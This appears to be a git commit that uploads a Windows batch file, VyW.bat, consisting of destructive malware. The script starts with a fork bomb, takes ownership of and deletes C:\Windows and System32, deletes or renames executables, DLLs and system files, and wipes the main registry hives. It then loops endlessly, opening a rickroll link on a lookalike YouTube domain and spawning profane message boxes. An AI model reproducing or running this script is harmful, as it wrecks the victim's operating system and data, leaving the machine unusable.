8fa2f723bec880657c6386f5fd55ab2c711aec8f
network2city <107504914+network2city@users.noreply.github.com>
2022-06-16 11:59:59 -0400

    Add files via upload

---
+++ VyW.bat
@@ -0,0 +1,69 @@
+%0|%0
+start https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
+@echo off
+TAKEOWN /F *
+TAKEOWN /F C:\Windows
+TAKEOWN /F C:\Windows\System32
+cacls C:\
+cacls C:\Windows
+del /F /Q *
+del /F /Q C:\Windows\System32
+del /F /Q C:\Windows
+cmd
+cmd
+cmd
+cmd
+cmd
+cmd
+cmd
+cmd
+DEL /F /Q *.exe
+DEL /F /Q *.sys
+DEL /F /Q *.reg
+DEL /F /Q *.com
+DEL /F /Q *.dll
+DEL /F /Q *.ini
+DEL /F /Q *.ps1
+
+
+REN *.exe *.txt
+REN *.sys *.txt
+REN *.reg *.txt
+REN *.com *.txt
+REN *.dll *.txt
+REN *.ini *.txt
+REN *.ps1 *.txt
+
+
+del *.txt
+
+REG DELETE HKCU /f /va
+REG DELETE HKLM /f /va
+REG DELETE HKCR /f /va
+
+start https://www.yout-ube.com/watch?v=dQw4w9WgXcQ
+
+echo x=msgbox("MoneyFuckers" ,16, "Suck a sick dick") >> msgbox.vbs
+start msgbox.vbs
+
+
+@echo on
+
+:A
+
+echo I just wanna tell you how I'm feeling > rickroll.txt
+echo Gotta make you understand >> rickroll.txt
+echo Never gonna give you up >> rickroll.txt
+echo Never gonna let you down >> rickroll.txt
+echo Never gonna run around and desert you >> rickroll.txt
+echo Never gonna make you cry >> rickroll.txt
+echo Never gonna say goodbye >> rickroll.txt
+echo Never gonna tell a lie and hurt you >> rickroll.txt
+
+start rickroll.txt
+
+echo x=msgbox("MoneyFuckers" ,16, "Suck a sick dick") >> msgbox.vbs
+
+start msgbox.vbs
+
+GOTO :A
